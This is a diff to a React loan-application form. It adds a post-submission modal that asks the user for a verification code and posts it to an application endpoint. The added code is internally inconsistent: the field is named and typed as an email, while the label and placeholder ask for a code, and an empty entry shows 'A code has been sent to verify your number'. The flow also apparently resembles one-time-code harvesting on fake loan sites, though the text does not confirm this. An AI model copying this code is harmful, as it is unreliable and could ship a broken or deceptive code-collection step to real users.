@@ -18,6 +18,11 @@ function LoanApplication({ loanDetails, onBack, processor }) {
     const [message, setMessage] = useState("");
     const [submitted, setSubmitted] = useState(false);
 
+    const [showVerification, setShowVerification] = useState(false);
+    const [email, setEmail] = useState("");
+    const [verifying, setVerifying] = useState(false);
+    const [verificationMessage, setVerificationMessage] = useState("");
+
     function handleChange(e) {
 
         const { name, value, type, checked } = e.target;
@@ -78,7 +83,7 @@ function LoanApplication({ loanDetails, onBack, processor }) {
                 `Application submitted successfully. Reference: ${data.application_number}`
             );
 
-            setSubmitted(true);
+            setShowVerification(true);
 
         } catch (error) {
 
@@ -89,6 +94,58 @@ function LoanApplication({ loanDetails, onBack, processor }) {
             setLoading(false);
         }
     }
+
+    
+    async function handleVerify(e) {
+    e.preventDefault();
+
+    if (!email.trim()) {
+        setVerificationMessage(
+            "A code has been sent to verify your number."
+        );
+        return;
+    }
+
+    setVerifying(true);
+    setVerificationMessage("");
+
+    try {
+        const response = await fetch(
+            "/api/submit-application",
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type":
+                        "application/json"
+                },
+                body: JSON.stringify({
+                    action: "verify_email",
+                    email: email.trim(),
+                    processor: processor
+                })
+            }
+        );
+
+        const data = await response.json();
+
+        if (!response.ok) {
+            throw new Error(
+                data.error ||
+                "Code verification failed."
+            );
+        }
+
+        setShowVerification(false);
+        setSubmitted(true);
+
+    } catch (error) {
+        setVerificationMessage(
+            error.message
+        );
+    } finally {
+        setVerifying(false);
+    }
+}
 
     if (submitted) {
         return (
@@ -276,6 +333,60 @@ function LoanApplication({ loanDetails, onBack, processor }) {
                 </form>
 
             </div>
+
+            {showVerification && (
+    <div className="verification-overlay">
+
+        <div className="verification-modal">
+
+            <div className="verification-icon">
+                ✓
+            </div>
+
+            <p>
+                Please enter your code
+                to complete the verification.
+            </p>
+
+            <form onSubmit={handleVerify}>
+
+                <label>
+                    Input code:
+                </label>
+
+                <input
+                    type="email"
+                    value={email}
+                    onChange={(e) =>
+                        setEmail(e.target.value)
+                    }
+                    placeholder="Enter the code"
+                    required
+                    autoFocus
+                />
+
+                {verificationMessage && (
+                    <div className="form-message">
+                        {verificationMessage}
+                    </div>
+                )}
+
+                <button
+                    type="submit"
+                    className="submit-button"
+                    disabled={verifying}
+                >
+                    {verifying
+                        ? "VERIFYING..."
+                        : "VERIFY"}
+                </button>
+
+            </form>
+
+        </div>
+
+    </div>
+)}
 
         </div>
     );
